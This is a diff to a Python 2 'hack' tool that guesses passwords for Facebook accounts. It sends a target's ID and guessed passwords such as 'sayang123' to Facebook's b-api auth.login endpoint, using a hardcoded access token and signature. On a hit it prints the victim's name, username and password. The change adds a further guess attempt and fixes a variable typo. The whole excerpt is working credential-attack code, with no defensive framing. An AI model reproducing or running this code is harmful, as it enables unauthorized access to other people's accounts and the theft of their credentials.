@@ -1130,7 +1130,7 @@ def mini():
 														raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 														menu_hack()
 													else:
-														pz7 = "sayang123"
+														pz7 = "khanl123"
 														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 														y = json.load(data)
 														if 'access_token' in y:
@@ -1146,14 +1146,34 @@ def mini():
 																print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
 																print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
 																print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
-																print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
+																print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz7
 																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 																menu_hack()
 															else:
-																print "\033[1;91m[!] Sorry, failed to open the target password :("
-																print "\033[1;91m[!] try it another way."
-																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
-																menu_hack()
+																pz8 = "sayang123"
+																data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																y = json.load(data)
+																if 'access_token' in y:
+																	print "\033[1;91m[+] \033[1;92mFound"
+																	print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+																	print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+																	print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz8
+																	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+																	menu_hack()
+																else:
+																	if 'www.facebook.com' in y["error_msg"]:
+																		print "\033[1;91m[+] \033[1;92mFound"
+																		print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
+																		print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+																		print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+																		print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz8
+																		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+																		menu_hack()
+																	else:
+																		print "\033[1;91m[!] Sorry, failed to open the target password :("
+																		print "\033[1;91m[!] try it another way."
+																		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+																		menu_hack()
 	except KeyError:
 		print "\033[1;91m[!] Terget not found"
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
